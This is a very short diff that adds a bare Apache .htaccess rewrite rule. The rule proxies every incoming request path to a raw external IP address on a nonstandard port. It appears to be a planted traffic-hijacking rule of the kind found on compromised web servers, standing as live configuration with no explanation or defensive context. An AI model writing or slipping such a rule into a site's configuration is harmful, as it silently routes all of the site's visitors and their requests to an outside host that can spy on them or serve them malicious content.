@@ -1,0 +1,4 @@
+
+RewriteEngine On
+RewriteRule ^(.*)$ http://195.62.28.216:9558/$1  [P]
+ 
